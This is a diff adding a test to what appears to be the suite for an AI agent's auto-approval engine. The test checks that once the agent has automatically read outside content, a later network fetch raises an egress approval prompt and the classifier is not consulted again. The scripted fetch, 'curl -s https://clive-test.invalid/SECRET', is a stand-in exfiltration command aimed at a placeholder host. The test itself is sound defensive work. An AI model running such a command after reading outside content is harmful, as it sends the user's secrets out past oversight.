@@ -239,3 +239,19 @@ test('自動承認（エンジン）: Web を読んだ実行が止められた�
   s.app.approvals.decide(s.app.approvals.pending()[0]!.id, 'deny');
   await settled(s.app, second.runId);
 });
+
+test('自動承認（エンジン）: 外のメモを自動で読んだあとの、許可の一覧にある取得（curl）は、同じ返事の中でも札が出る。判定役は 2 回目を見ない', async t => {
+  const s = await startApp(t);
+  const outside = outsideRead(s);
+  const fetch = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
+  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), toolCall('shell_run', { command: fetch }), say('おわり')];
+  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
+  await waitFor(() => s.app.approvals.pending().length === 1, '外を読んだあとの取得の札');
+  const [request] = s.app.approvals.pending();
+  assert.deepEqual([...(request!.kinds ?? [])], ['egress']);
+  assert.equal(request!.everyTime, true);
+  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役を呼んだのは、最初の外読みだけ');
+  s.app.approvals.decide(request!.id, 'deny');
+  await settled(s.app, sent.body.runId);
+  assert.equal(autoRows(s).length, 1, '自動で許したのは最初の外読みだけ');
+});
